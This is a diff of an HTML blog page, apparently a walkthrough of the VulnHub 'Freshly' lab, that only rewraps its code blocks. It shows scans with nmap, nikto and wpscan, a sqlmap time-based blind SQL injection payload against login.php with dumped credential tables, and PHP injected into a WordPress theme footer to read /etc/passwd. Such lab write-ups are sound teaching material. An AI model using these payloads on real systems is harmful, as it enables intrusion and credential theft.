@@ -107,26 +107,26 @@ for verification. :)"</p>
 <h1>Discovery</h1>
 <p>As always we need to know which ports are open.</p>
 <h2>nmap</h2>
-<div class="highlight"><pre><span></span># Nmap 6.47 scan initiated Thu Apr 16 19:13:39 2015 as: nmap -A -A -oA nmap 10.0.2.5
-Nmap scan report for 10.0.2.5
-Host is up (0.00087s latency).
-Not shown: 997 closed ports
-PORT     STATE SERVICE  VERSION
-80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))
-|_http-title: Site doesn&#39;t have a title (text/html).
-443/tcp  open  ssl/http Apache httpd
-|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
-|_http-title: Site doesn&#39;t have a title (text/html).
-| ssl-cert: Subject: commonName=www.example.com
-| Not valid before: 2015-02-17T03:30:05+00:00
-|_Not valid after:  2025-02-14T03:30:05+00:00
-|_ssl-date: 2047-09-11T02:34:36+00:00; +32y147d13h20m44s from local time.
-8080/tcp open  http     Apache httpd
-|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
-|_http-title: Site doesn&#39;t have a title (text/html).
-
-Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
-# Nmap done at Thu Apr 16 19:13:52 2015 -- 1 IP address (1 host up) scanned in 12.77 seconds
+<div class="highlight"><pre><span class="code-line"><span></span># Nmap 6.47 scan initiated Thu Apr 16 19:13:39 2015 as: nmap -A -A -oA nmap 10.0.2.5</span>
+<span class="code-line">Nmap scan report for 10.0.2.5</span>
+<span class="code-line">Host is up (0.00087s latency).</span>
+<span class="code-line">Not shown: 997 closed ports</span>
+<span class="code-line">PORT     STATE SERVICE  VERSION</span>
+<span class="code-line">80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))</span>
+<span class="code-line">|_http-title: Site doesn&#39;t have a title (text/html).</span>
+<span class="code-line">443/tcp  open  ssl/http Apache httpd</span>
+<span class="code-line">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</span>
+<span class="code-line">|_http-title: Site doesn&#39;t have a title (text/html).</span>
+<span class="code-line">| ssl-cert: Subject: commonName=www.example.com</span>
+<span class="code-line">| Not valid before: 2015-02-17T03:30:05+00:00</span>
+<span class="code-line">|_Not valid after:  2025-02-14T03:30:05+00:00</span>
+<span class="code-line">|_ssl-date: 2047-09-11T02:34:36+00:00; +32y147d13h20m44s from local time.</span>
+<span class="code-line">8080/tcp open  http     Apache httpd</span>
+<span class="code-line">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</span>
+<span class="code-line">|_http-title: Site doesn&#39;t have a title (text/html).</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .</span>
+<span class="code-line"># Nmap done at Thu Apr 16 19:13:52 2015 -- 1 IP address (1 host up) scanned in 12.77 seconds</span>
 </pre></div>
 
 
@@ -144,18 +144,18 @@ one, but nothing.</em></p>
 <p>I like to use <a href="https://cirt.net/Nikto2">Nikto</a> when discovering website, I will put only the
 interesting stuff, but I ran <a href="https://cirt.net/Nikto2">Nikto</a> on the 3 ports.</p>
 <p>Port 80:</p>
-<div class="highlight"><pre><span></span>[maggick@rootine Freshly]$ nikto -host 10.0.2.5
-Server: Apache/2.4.7 (Ubuntu)
-+ /login.php: Admin login page/section found.
-+ /phpmyadmin/: phpMyAdmin directory found
+<div class="highlight"><pre><span class="code-line"><span></span>[maggick@rootine Freshly]$ nikto -host 10.0.2.5</span>
+<span class="code-line">Server: Apache/2.4.7 (Ubuntu)</span>
+<span class="code-line">+ /login.php: Admin login page/section found.</span>
+<span class="code-line">+ /phpmyadmin/: phpMyAdmin directory found</span>
 </pre></div>
 
 
 <p><img alt="login.php" src="/media/2015.04/login.php.png"></p>
 <p>Port 8080:</p>
-<div class="highlight"><pre><span></span>[maggick@rootine Freshly]$ nikto -host 10.0.2.5 -port 8080
-+ OSVDB-3268: /img/: Directory indexing found.
-+ /wordpress/: A Wordpress installation was found
+<div class="highlight"><pre><span class="code-line"><span></span>[maggick@rootine Freshly]$ nikto -host 10.0.2.5 -port 8080</span>
+<span class="code-line">+ OSVDB-3268: /img/: Directory indexing found.</span>
+<span class="code-line">+ /wordpress/: A Wordpress installation was found</span>
 </pre></div>
 
 
@@ -166,54 +166,54 @@ look at the wordpress installation.</p>
 was not usefull.</em></p>
 <h2>WPScan</h2>
 <p>We run <a href="https://github.com/wpscanteam/wpscan"><code>wpscan</code></a> on the 8080 website:</p>
-<div class="highlight"><pre><span></span>[maggick@rootine wpscan]$ ruby wpscan.rb --url http://10.0.2.5:8080/wordpress/
-[+] URL: http://10.0.2.5:8080/wordpress/
-[+] Started: Thu Apr 16 20:01:39 2015
-
-[!] The WordPress &#39;http://10.0.2.5:8080/wordpress/readme.html&#39; file exists exposing a version number
-[!] Full Path Disclosure (FPD) in: &#39;http://10.0.2.5:8080/wordpress/wp-includes/rss-functions.php&#39;
-[+] Interesting header: SERVER: Apache
-[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
-[+] XML-RPC Interface available under: http://10.0.2.5:8080/wordpress/xmlrpc.php
-
-[+] WordPress version 4.1.1 identified from meta generator
-
-[+] Enumerating plugins from passive detection ...
- | 4 plugins found:
-
-[+] Name: cart66-lite - v1.5.3
- |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/
- |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt
-
-[!] Title: Cart66 Lite &lt;= 1.5.3 - SQL Injection
-    Reference: https://wpvulndb.com/vulnerabilities/7737
-    Reference: https://research.g0blin.co.uk/g0blin-00022/
-    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
-[i] Fixed in: 1.5.4
-
-[+] Name: contact-form-7 - v4.1
- |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/contact-form-7/
- |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/contact-form-7/readme.txt
-
-[+] Name: proplayer - v4.7.9.1
- |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/proplayer/
- |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/proplayer/readme.txt
-
-[!] Title: ProPlayer 4.7.9.1 - SQL Injection
-    Reference: https://wpvulndb.com/vulnerabilities/6912
-    Reference: http://osvdb.org/93564
-    Reference: http://www.exploit-db.com/exploits/25605/
-
-[+] Name: all-in-one-seo-pack - v2.2.5.1
- |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/
- |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/readme.txt
-
-[!] Title: All in One SEO Pack &lt;= 2.2.5.1 - Authentication Bypass
-    Reference: https://wpvulndb.com/vulnerabilities/7881
-    Reference: http://jvn.jp/en/jp/JVN75615300/index.html
-    Reference: http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
-    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0902
-[i] Fixed in: 2.2.6
+<div class="highlight"><pre><span class="code-line"><span></span>[maggick@rootine wpscan]$ ruby wpscan.rb --url http://10.0.2.5:8080/wordpress/</span>
+<span class="code-line">[+] URL: http://10.0.2.5:8080/wordpress/</span>
+<span class="code-line">[+] Started: Thu Apr 16 20:01:39 2015</span>
+<span class="code-line"></span>
+<span class="code-line">[!] The WordPress &#39;http://10.0.2.5:8080/wordpress/readme.html&#39; file exists exposing a version number</span>
+<span class="code-line">[!] Full Path Disclosure (FPD) in: &#39;http://10.0.2.5:8080/wordpress/wp-includes/rss-functions.php&#39;</span>
+<span class="code-line">[+] Interesting header: SERVER: Apache</span>
+<span class="code-line">[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN</span>
+<span class="code-line">[+] XML-RPC Interface available under: http://10.0.2.5:8080/wordpress/xmlrpc.php</span>
+<span class="code-line"></span>
+<span class="code-line">[+] WordPress version 4.1.1 identified from meta generator</span>
+<span class="code-line"></span>
+<span class="code-line">[+] Enumerating plugins from passive detection ...</span>
+<span class="code-line"> | 4 plugins found:</span>
+<span class="code-line"></span>
+<span class="code-line">[+] Name: cart66-lite - v1.5.3</span>
+<span class="code-line"> |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/</span>
+<span class="code-line"> |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt</span>
+<span class="code-line"></span>
+<span class="code-line">[!] Title: Cart66 Lite &lt;= 1.5.3 - SQL Injection</span>
+<span class="code-line">    Reference: https://wpvulndb.com/vulnerabilities/7737</span>
+<span class="code-line">    Reference: https://research.g0blin.co.uk/g0blin-00022/</span>
+<span class="code-line">    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442</span>
+<span class="code-line">[i] Fixed in: 1.5.4</span>
+<span class="code-line"></span>
+<span class="code-line">[+] Name: contact-form-7 - v4.1</span>
+<span class="code-line"> |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/contact-form-7/</span>
+<span class="code-line"> |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/contact-form-7/readme.txt</span>
+<span class="code-line"></span>
+<span class="code-line">[+] Name: proplayer - v4.7.9.1</span>
+<span class="code-line"> |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/proplayer/</span>
+<span class="code-line"> |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/proplayer/readme.txt</span>
+<span class="code-line"></span>
+<span class="code-line">[!] Title: ProPlayer 4.7.9.1 - SQL Injection</span>
+<span class="code-line">    Reference: https://wpvulndb.com/vulnerabilities/6912</span>
+<span class="code-line">    Reference: http://osvdb.org/93564</span>
+<span class="code-line">    Reference: http://www.exploit-db.com/exploits/25605/</span>
+<span class="code-line"></span>
+<span class="code-line">[+] Name: all-in-one-seo-pack - v2.2.5.1</span>
+<span class="code-line"> |  Location: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/</span>
+<span class="code-line"> |  Readme: http://10.0.2.5:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/readme.txt</span>
+<span class="code-line"></span>
+<span class="code-line">[!] Title: All in One SEO Pack &lt;= 2.2.5.1 - Authentication Bypass</span>
+<span class="code-line">    Reference: https://wpvulndb.com/vulnerabilities/7881</span>
+<span class="code-line">    Reference: http://jvn.jp/en/jp/JVN75615300/index.html</span>
+<span class="code-line">    Reference: http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/</span>
+<span class="code-line">    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0902</span>
+<span class="code-line">[i] Fixed in: 2.2.6</span>
 </pre></div>
 
 
@@ -231,76 +231,76 @@ injectable.</p>
 <h2>sqlmap</h2>
 <p>We need to use burp in order to save the POST request to a file, an then we
 launch <a href="http://sqlmap,org">sqlmap</a> on the <code>login.php</code> URL:</p>
-<div class="highlight"><pre><span></span>[maggick@rootine sqlmap]$ python2 sqlmap.py -r login_req -p user
-         _
- ___ ___| |_____ ___ ___  {1.0-dev-dbfa8f1}
-|_ -| . | |     | .&#39;| . |
-|___|_  |_|_|_|_|__,|  _|
-      |_|           |_|   http://sqlmap.org
-
-[*] starting at 20:43:22
-
-[20:43:22] [INFO] parsing HTTP request from &#39;/home/maggick/work/chall/vulnhub/Freshly/login_req&#39;
-[20:43:22] [INFO] resuming back-end DBMS &#39;mysql&#39;
-[20:43:22] [INFO] testing connection to the target URL
-[20:43:22] [INFO] heuristics detected web page charset &#39;ascii&#39;
-sqlmap identified the following injection points with a total of 0 HTTP(s)
-requests:
----
-Parameter: user (POST)
-    Type: AND/OR time-based blind
-    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)
-    Payload: user=asdf&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))RaKL) AND &#39;KuPd&#39;=&#39;KuPd&amp;password=asdf&amp;s=Submit
----
-[20:43:22] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu
-web application technology: Apache 2.4.7, PHP 5.5.9
-back-end DBMS: MySQL 5.0.12
-[20:43:22] [INFO] fetched data logged to text files under &#39;/home/maggick/.sqlmap/output/10.0.2.5&#39;
-
-[*] shutting down at 20:43:22
+<div class="highlight"><pre><span class="code-line"><span></span>[maggick@rootine sqlmap]$ python2 sqlmap.py -r login_req -p user</span>
+<span class="code-line">         _</span>
+<span class="code-line"> ___ ___| |_____ ___ ___  {1.0-dev-dbfa8f1}</span>
+<span class="code-line">|_ -| . | |     | .&#39;| . |</span>
+<span class="code-line">|___|_  |_|_|_|_|__,|  _|</span>
+<span class="code-line">      |_|           |_|   http://sqlmap.org</span>
+<span class="code-line"></span>
+<span class="code-line">[*] starting at 20:43:22</span>
+<span class="code-line"></span>
+<span class="code-line">[20:43:22] [INFO] parsing HTTP request from &#39;/home/maggick/work/chall/vulnhub/Freshly/login_req&#39;</span>
+<span class="code-line">[20:43:22] [INFO] resuming back-end DBMS &#39;mysql&#39;</span>
+<span class="code-line">[20:43:22] [INFO] testing connection to the target URL</span>
+<span class="code-line">[20:43:22] [INFO] heuristics detected web page charset &#39;ascii&#39;</span>
+<span class="code-line">sqlmap identified the following injection points with a total of 0 HTTP(s)</span>
+<span class="code-line">requests:</span>
+<span class="code-line">---</span>
+<span class="code-line">Parameter: user (POST)</span>
+<span class="code-line">    Type: AND/OR time-based blind</span>
+<span class="code-line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)</span>
+<span class="code-line">    Payload: user=asdf&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))RaKL) AND &#39;KuPd&#39;=&#39;KuPd&amp;password=asdf&amp;s=Submit</span>
+<span class="code-line">---</span>
+<span class="code-line">[20:43:22] [INFO] the back-end DBMS is MySQL</span>
+<span class="code-line">web server operating system: Linux Ubuntu</span>
+<span class="code-line">web application technology: Apache 2.4.7, PHP 5.5.9</span>
+<span class="code-line">back-end DBMS: MySQL 5.0.12</span>
+<span class="code-line">[20:43:22] [INFO] fetched data logged to text files under &#39;/home/maggick/.sqlmap/output/10.0.2.5&#39;</span>
+<span class="code-line"></span>
+<span class="code-line">[*] shutting down at 20:43:22</span>
 </pre></div>
 
 
 <p>Okay the <code>user</code> parameter is vulnerable to a time-based blind injection. Let's
 see what are the databases:</p>
-<div class="highlight"><pre><span></span>[maggick@rootine sqlmap]$ python2 sqlmap.py -r ~/work/chall/vulnhub/Freshly/longin_req -p user --dbs
-back-end DBMS: MySQL 5.0.12
-[...]
-available databases [7]:
-[*] information_schema
-[*] login
-[*] mysql
-[*] performance_schema
-[*] phpmyadmin
-[*] users
-[*] wordpress8080
+<div class="highlight"><pre><span class="code-line"><span></span>[maggick@rootine sqlmap]$ python2 sqlmap.py -r ~/work/chall/vulnhub/Freshly/longin_req -p user --dbs</span>
+<span class="code-line">back-end DBMS: MySQL 5.0.12</span>
+<span class="code-line">[...]</span>
+<span class="code-line">available databases [7]:</span>
+<span class="code-line">[*] information_schema</span>
+<span class="code-line">[*] login</span>
+<span class="code-line">[*] mysql</span>
+<span class="code-line">[*] performance_schema</span>
+<span class="code-line">[*] phpmyadmin</span>
+<span class="code-line">[*] users</span>
+<span class="code-line">[*] wordpress8080</span>
 </pre></div>
 
 
 <p>Let's dump the interesting databases, <code>users</code> and <code>login</code>:</p>
 <p>users:</p>
-<div class="highlight"><pre><span></span>Database: login
-Table: users
-[2 entries]
-+----------+-----------+
-| password | user_name |
-+----------+-----------+
-| password | candyshop |
-| PopRocks | Sir       |
-+----------+-----------+
+<div class="highlight"><pre><span class="code-line"><span></span>Database: login</span>
+<span class="code-line">Table: users</span>
+<span class="code-line">[2 entries]</span>
+<span class="code-line">+----------+-----------+</span>
+<span class="code-line">| password | user_name |</span>
+<span class="code-line">+----------+-----------+</span>
+<span class="code-line">| password | candyshop |</span>
+<span class="code-line">| PopRocks | Sir       |</span>
+<span class="code-line">+----------+-----------+</span>
 </pre></div>
 
 
 <p>login:</p>
-<div class="highlight"><pre><span></span>Database: wordpress8080
-Table: users
-[1 entry]
-+----------+---------------------+
-| username | password            |
-+----------+---------------------+
-| admin    | SuperSecretPassword |
-+----------+---------------------+
+<div class="highlight"><pre><span class="code-line"><span></span>Database: wordpress8080</span>
+<span class="code-line">Table: users</span>
+<span class="code-line">[1 entry]</span>
+<span class="code-line">+----------+---------------------+</span>
+<span class="code-line">| username | password            |</span>
+<span class="code-line">+----------+---------------------+</span>
+<span class="code-line">| admin    | SuperSecretPassword |</span>
+<span class="code-line">+----------+---------------------+</span>
 </pre></div>
 
 
@@ -311,41 +311,41 @@ Table: users
 <p>As we want to read a file on the system, let's put some PHP code in the theme:
 We go to Appearance -&gt; Editor -&gt; Footer (footer.php) and add some PHP code in
 order to execute it, let's get the <code>/etc/passwd</code> file :</p>
-<div class="highlight"><pre><span></span><span class="x"> </span><span class="cp">&lt;?php</span>
-<span class="nv">$myfile</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Unable to open file!&quot;</span><span class="p">);</span>
-<span class="k">echo</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nb">filesize</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">));</span>
-<span class="nb">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="x"></span>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="x"> </span><span class="cp">&lt;?php</span></span>
+<span class="code-line"><span class="nv">$myfile</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Unable to open file!&quot;</span><span class="p">);</span></span>
+<span class="code-line"><span class="k">echo</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nb">filesize</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">));</span></span>
+<span class="code-line"><span class="nb">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span></span>
+<span class="code-line"><span class="cp">?&gt;</span><span class="x"></span></span>
 </pre></div>
 
 
 <p>When we reload the index page we got the <code>/etc/password</code> file in the footer:</p>
-<div class="highlight"><pre><span></span>root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-libuuid:x:100:101::/var/lib/libuuid:
-syslog:x:101:104::/home/syslog:/bin/false
-messagebus:x:102:105::/var/run/dbus:/bin/false
-user:x:1000:1000:user,,,:/home/user:/bin/bash
-mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
-candycane:x:1001:1001::/home/candycane:
-# YOU STOLE MY SECRET FILE!
-# SECRET = &quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;
+<div class="highlight"><pre><span class="code-line"><span></span>root:x:0:0:root:/root:/bin/bash</span>
+<span class="code-line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+<span class="code-line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
+<span class="code-line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
+<span class="code-line">sync:x:4:65534:sync:/bin:/bin/sync</span>
+<span class="code-line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
+<span class="code-line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
+<span class="code-line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
+<span class="code-line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
+<span class="code-line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
+<span class="code-line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
+<span class="code-line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
+<span class="code-line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
+<span class="code-line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
+<span class="code-line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
+<span class="code-line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span>
+<span class="code-line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span>
+<span class="code-line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
+<span class="code-line">libuuid:x:100:101::/var/lib/libuuid:</span>
+<span class="code-line">syslog:x:101:104::/home/syslog:/bin/false</span>
+<span class="code-line">messagebus:x:102:105::/var/run/dbus:/bin/false</span>
+<span class="code-line">user:x:1000:1000:user,,,:/home/user:/bin/bash</span>
+<span class="code-line">mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false</span>
+<span class="code-line">candycane:x:1001:1001::/home/candycane:</span>
+<span class="code-line"># YOU STOLE MY SECRET FILE!</span>
+<span class="code-line"># SECRET = &quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;</span>
 </pre></div>
 
 
